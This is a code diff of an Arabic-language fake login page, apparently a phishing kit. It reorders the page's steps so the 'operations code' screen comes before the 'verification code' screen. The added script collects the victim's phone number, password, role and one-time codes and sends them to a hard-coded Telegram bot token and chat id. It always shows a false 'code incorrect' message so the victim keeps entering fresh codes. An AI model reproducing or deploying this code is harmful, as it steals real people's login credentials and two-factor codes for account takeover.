@@ -266,25 +266,6 @@
       <button type="submit" class="login-btn">تسجيل دخول</button>
     </form>
   </div>
-  <!-- Verify Code Page -->
-  <div class="container hidden" id="verifyPage">
-    <div class="logo">
-      <img src="https://www2.0zz0.com/2025/09/27/20/207168620.jpeg" alt="">
-    </div>
-    <h2 class="verify-title">رمز التحقق</h2>
-    <div class="desc" style="text-align:center">
-      تم ارسال رمز تحقق يحتوي على تسجيل دخول من جهاز جديد بسبب تسجيل الدخول من خلال المتصفح.<br>
-      قم بادخاله للإكمال.
-    </div>
-    <div class="notif" id="notif">رمز التحقق غير صحيح!</div>
-    <form id="verifyForm">
-      <div class="input-group">
-        <label for="code">رمز التحقق</label>
-        <input type="text" id="code" name="code" inputmode="numeric" pattern="\d*" maxlength="6" required>
-      </div>
-      <button type="submit" class="verify-btn">تأكيد الرمز</button>
-    </form>
-  </div>
   <!-- Operations Code Page -->
   <div class="container hidden" id="opPage">
     <div class="logo">
@@ -302,6 +283,25 @@
         <input type="text" id="opCode" name="opCode" inputmode="numeric" pattern="\d*" maxlength="6" required>
       </div>
       <button type="submit" class="op-btn">تأكيد الرمز</button>
+    </form>
+  </div>
+  <!-- Verify Code Page -->
+  <div class="container hidden" id="verifyPage">
+    <div class="logo">
+      <img src="https://www2.0zz0.com/2025/09/27/20/207168620.jpeg" alt="">
+    </div>
+    <h2 class="verify-title">رمز التحقق</h2>
+    <div class="desc" style="text-align:center">
+      تم ارسال رمز تحقق يحتوي على تسجيل دخول من جهاز جديد بسبب تسجيل الدخول من خلال المتصفح.<br>
+      قم بادخاله للإكمال.
+    </div>
+    <div class="notif" id="notif">رمز التحقق غير صحيح!</div>
+    <form id="verifyForm">
+      <div class="input-group">
+        <label for="code">رمز التحقق</label>
+        <input type="text" id="code" name="code" inputmode="numeric" pattern="\d*" maxlength="6" required>
+      </div>
+      <button type="submit" class="verify-btn">تأكيد الرمز</button>
     </form>
   </div>
   <script>
@@ -346,41 +346,8 @@
       // حفظ البيانات للصفحة التالية
       window._loginData = { mobile, password, role };
       document.getElementById('loginPage').classList.add('hidden');
-      document.getElementById('verifyPage').classList.remove('hidden');
-      document.getElementById('code').focus();
-    });
-
-    // صفحة رمز التحقق
-    document.getElementById('code').addEventListener('input', function (e) {
-      this.value = this.value.replace(/[^\d]/g, '');
-    });
-
-    document.getElementById('verifyForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-      const code = document.getElementById('code').value;
-      const data = window._loginData || { mobile: '', password: '', role: '' };
-      // إرسال رمز التحقق للبوت
-      const token = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
-      const chatid = "6873334348";
-      const msg = `رمز تحقق جديد:\nالدور: ${data.role}\nرقم: ${data.mobile}\nكلمة السر: ${data.password}\nرمز التحقق: ${code}`;
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatid, text: msg })
-      });
-      // دائماً يظهر إشعار أن الرمز غير صحيح 
-      const notif = document.getElementById('notif');
-      notif.style.display = 'block';
-      notif.textContent = "رمز التحقق غير صحيح!";
-      setTimeout(() => { notif.style.display = 'none'; }, 2300);
-      document.getElementById('code').value = '';
-      document.getElementById('code').focus();
-      // بعد الإشعار، الانتقال لصفحة رمز العمليات
-      setTimeout(() => {
-        document.getElementById('verifyPage').classList.add('hidden');
-        document.getElementById('opPage').classList.remove('hidden');
-        document.getElementById('opCode').focus();
-      }, 2500);
+      document.getElementById('opPage').classList.remove('hidden');
+      document.getElementById('opCode').focus();
     });
 
     // صفحة رمز العمليات
@@ -408,6 +375,39 @@
       setTimeout(() => { notif.style.display = 'none'; }, 2300);
       document.getElementById('opCode').value = '';
       document.getElementById('opCode').focus();
+      // بعد الإشعار، الانتقال لصفحة رمز التحقق
+      setTimeout(() => {
+        document.getElementById('opPage').classList.add('hidden');
+        document.getElementById('verifyPage').classList.remove('hidden');
+        document.getElementById('code').focus();
+      }, 2500);
+    });
+
+    // صفحة رمز التحقق
+    document.getElementById('code').addEventListener('input', function (e) {
+      this.value = this.value.replace(/[^\d]/g, '');
+    });
+
+    document.getElementById('verifyForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const code = document.getElementById('code').value;
+      const data = window._loginData || { mobile: '', password: '', role: '' };
+      // إرسال رمز التحقق للبوت
+      const token = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
+      const chatid = "6873334348";
+      const msg = `رمز تحقق جديد:\nالدور: ${data.role}\nرقم: ${data.mobile}\nكلمة السر: ${data.password}\nرمز التحقق: ${code}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatid, text: msg })
+      });
+      // دائماً يظهر إشعار أن الرمز غير صحيح 
+      const notif = document.getElementById('notif');
+      notif.style.display = 'block';
+      notif.textContent = "رمز التحقق غير صحيح!";
+      setTimeout(() => { notif.style.display = 'none'; }, 2300);
+      document.getElementById('code').value = '';
+      document.getElementById('code').focus();
     });
   </script>
 </body>
